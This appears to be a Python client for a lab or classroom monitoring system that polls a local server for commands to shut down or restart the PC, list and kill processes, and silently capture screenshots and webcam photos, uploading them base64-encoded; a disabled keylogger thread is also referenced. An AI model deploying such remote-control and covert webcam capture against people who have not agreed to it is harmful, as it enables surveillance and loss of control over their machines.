import threading
import time
import subprocess
import base64
# from src.dbcon import *
import cv2
import requests
ip="192.168.29.39"
class processkillthread (threading.Thread):
    def __init__(self,sid):
       threading.Thread.__init__(self)
       self.sid=sid

    def run(self):
        count=0
        rlist=[]
        while(1):
            count=count+1
            # print("==============================")
            if count == 10:
                pp=[]
                import wmi
                f = wmi.WMI()
                for process in f.Win32_Process():
                    print(f"{process.ProcessId:<10} {process.Name}")
                    if process.Name in rlist:
                        import pyautogui
                        myScreenshot = pyautogui.screenshot()
                        import time
                        fnm = time.strftime("%Y%m%d-%H%M%S")
                        myScreenshot.save(""+fnm + ".jpg")
                        myScreenshot = cv2.imread(fnm + ".jpg")
                        myScreenshot = cv2.resize(myScreenshot, (200, 200))
                        cv2.imwrite(fnm + ".jpg", myScreenshot)
                        # db.insert("INSERT INTO screenshot VALUES (null,'"+"/static/screenshot/"+fnm+".jpg"+"','"+str(self.sid)+"',now())")
                        # # db.delete("delete from screenshot WHERE scid='"+str(i["scid"])+"'")
                        cap = cv2.VideoCapture(0)
                        _, frame1 = cap.read()
                        _, frame1 = cap.read()
                        _, frame1 = cap.read()
                        _, frame1 = cap.read()
                        _, frame1 = cap.read()
                        frame1 = cv2.resize(frame1, (200, 200))
                        cv2.imwrite("s" + fnm + ".jpg", frame1)
                        cap.release()


                        with open(""+fnm + ".jpg", "rb") as image2string:
                            image_string = base64.b64encode(image2string.read())
                            # f = myScreenshot.read()
                            # print (f)
                            # image_string = base64.b64encode(f)
                            image_string = image_string.decode('utf-8')


                            myobj = {'fn': fnm + ".jpg", "p": image_string, "id": str(self.sid)}
                            requests.post("http://" + ip + ":8000/upf", params=myobj)
                        with open("s" + fnm + ".jpg", "rb") as image2string:
                            image_string = base64.b64encode(image2string.read())
                            # f = myScreenshot.read()
                            # print (f)
                            # image_string = base64.b64encode(f)
                            image_string = image_string.decode('utf-8')

                            myobj = {'fn': "s"+fnm + ".jpg", "p": image_string, "id": str(self.sid)}

                            requests.post("http://"+ip+":8000/upf", params=myobj)
                        requests.get(
                            "http://" + ip + ":8000/upn?cp=s" + fnm + ".jpg&p="+process.Name+"&sc=" + fnm + ".jpg&id=" + str(self.sid))
                        break
                count=0
            qrr = requests.get("http://"+ip+":8000/process?p="+str(self.sid))

            lis= qrr.text.split("#")
            print(lis)



            import psutil

            for proc in psutil.process_iter():
                # print(proc.name())
                try:

                    processName = proc.name()
                    processID = proc.pid
                    if  "sd" in lis:
                        subprocess.call(["shutdown", "-s", "-t", "20"])
                        break
                        print ("=================================================")
                        print ("=================================================")
                        print ("=================================================")
                        print ("=================================================")
                        print ("=================================================")
                    elif "bgp" in lis:
                        import wmi
                        f = wmi.WMI()
                        print("pid   Process name")

                        p=[]

                        for process in f.Win32_Process():
                            print(f"{process.ProcessId:<10} {process.Name}")
                            p.append(process.Name)
                        # p1 = "#".join(p)
                        # print(p1, "eeeeeeeeeeeeeeeeeeeeeeeeeee")
                        for i in p:
                         qrr = requests.get("http://"+ip+":8000/insprocess?p=" + str(self.sid)+"&pr="+i)
                        # db=Db()
                        # res=db.select("SELECT * FROM `process` WHERE `sid`='2' " )
                        # if res is not None:
                        #     db.delete("delete from process where sid='2' ")
                        #     db.insert("INSERT INTO `process` VALUES(NULL,'2','"+p1+"')")
                        # else:
                        #     db.insert("INSERT INTO `process` VALUES(NULL,'2','" + p1 + "')")




                        break






                    elif  "sc" in lis:


                        import pyautogui
                        myScreenshot = pyautogui.screenshot()
                        import time
                        fnm = time.strftime("%Y%m%d-%H%M%S")
                        #
                        myScreenshot.save(fnm + ".jpg")
                        myScreenshot=cv2.imread(fnm + ".jpg")
                        myScreenshot = cv2.resize(myScreenshot, (200, 200))
                        cv2.imwrite( fnm + ".jpg", myScreenshot)
                        # db.insert("INSERT INTO screenshot VALUES (null,'"+"/static/screenshot/"+fnm+".jpg"+"','"+str(self.sid)+"',now())")
                        # # db.delete("delete from screenshot WHERE scid='"+str(i["scid"])+"'")
                        cap = cv2.VideoCapture(0)
                        _, frame1 = cap.read()
                        _, frame1 = cap.read()
                        _, frame1 = cap.read()
                        _, frame1 = cap.read()
                        _, frame1 = cap.read()
                        frame1=cv2.resize(frame1, (200, 200))
                        cv2.imwrite("s"+fnm + ".jpg",frame1)
                        cap.release()

                        with open( fnm + ".jpg", "rb") as image2string:
                            image_string = base64.b64encode(image2string.read())
                            # f = myScreenshot.read()
                            # print (f)
                            # image_string = base64.b64encode(f)
                            # image_string = image_string.decode('utf-8')
                            #
                            # myobj = {'fn': fnm + ".jpg", "p": image_string,"id":str(self.sid)}
                            image_string = image_string.decode('utf-8')

                            myobj = {'fn': fnm + ".jpg", "p": image_string,"id":str(self.sid)}
                            requests.post("http://" + ip + ":8000/upf", params=myobj)
                        with open( "s"+fnm + ".jpg", "rb") as image2string:
                            image_string = base64.b64encode(image2string.read())

                            image_string = image_string.decode('utf-8')

                            myobj = {'fn': "s"+fnm + ".jpg", "p": image_string,"id":str(self.sid)}
                            requests.post("http://" + ip + ":8000/upf", params=myobj)
                        requests.get(
                            "http://" + ip + ":8000/up?cp=s" + fnm + ".jpg&sc=" + fnm + ".jpg&id=" + str(self.sid))
                        #
                        #     requests.post("http://"+ip+":8000/up1", params=myobj)
                        indexx=lis.index("sc")
                        lis[indexx]=""
                        print(lis,"=====================+++++")
                    elif "rs" in lis:
                        subprocess.call(["shutdown", "-r", "-t", "20"])
                        break
                    elif processName in lis:
                        import psutil
                        PROCNAME = processName

                        for proc in psutil.process_iter():
                            # print(proc.name(),"llll")
                            if proc.name() == PROCNAME:
                                # print("ok")
                                proc.kill()


                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
                # print("kkk")

            # print('haiii')


def getmacaddress():
    import uuid
    # print("The MAC address in formatted way is : ", end="")
    k = (':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1]))
    return k

macid = getmacaddress()
print(macid)
systemid = "4"
# qry = "select s_id from system where system_mac='" + macid + "'"
# db = Db()
# res = db.selectOne(qry)
# print("PPPPPPPPPPPPP ", systemid)
# if res is not None:
#     systemid = res["s_id"]
# else:
#     systemid = "0"
# # Create new threads

keythread = processkillthread(systemid)
keythread.run()
# Create new threads
# def kw():
#     keythread = keyboardlogeerthread(systemid)
#     keythread.run()
#
#
# kw()